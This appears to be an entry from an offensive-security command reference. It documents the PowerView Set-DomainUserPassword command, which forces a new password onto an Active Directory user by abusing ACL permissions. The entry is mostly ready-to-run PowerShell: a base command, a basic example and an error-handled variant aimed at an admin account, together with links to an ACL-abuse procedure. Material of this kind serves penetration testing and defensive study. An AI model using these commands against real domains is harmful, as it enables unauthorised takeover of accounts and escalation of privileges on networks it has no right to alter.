---
type: command
executor: powershell
data: |-
  $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
  Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
output: null
platforms:
  - Windows
tags:
  - active-directory
  - password-change
verified: true
validated: true
---

# Set-Domain-User-Password-PowerShell

## Command

```powershell
$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
```

## Description

This command uses PowerView to set a new password for a domain user by abusing ACL permissions. It first converts the plaintext password to a secure string, then applies it to the target user via LDAP modification.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 'Password123!' | New plaintext password to set | Yes |
| 'TargetUser' | Username (sAMAccountName) of the target domain user | Yes |
| -Identity | Specifies the target user for the Set-DomainUserPassword function | Yes |
| -AccountPassword | Secure string containing the new password | Yes |

## Examples

### Basic Usage

```powershell
$NewPassword = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'jdoe' -AccountPassword $NewPassword
```

### Advanced Usage

```powershell
# With error handling
try {
    $NewPassword = ConvertTo-SecureString 'ComplexPass!' -AsPlainText -Force
    Set-DomainUserPassword -Identity 'adminuser' -AccountPassword $NewPassword -ErrorAction Stop
    Write-Output 'Password changed successfully'
} catch {
    Write-Error 'Failed to change password: ' + $_.Exception.Message
}
```

## Expected Output

No output on success. On failure: Error message like "Access is denied" or "Insufficient privileges to complete the operation."

## Related

- [[procedures/Force-Change-Domain-User-Password-via-ACL-Abuse]]
- [[codes/PowerShell-Set-Domain-User-Password]]
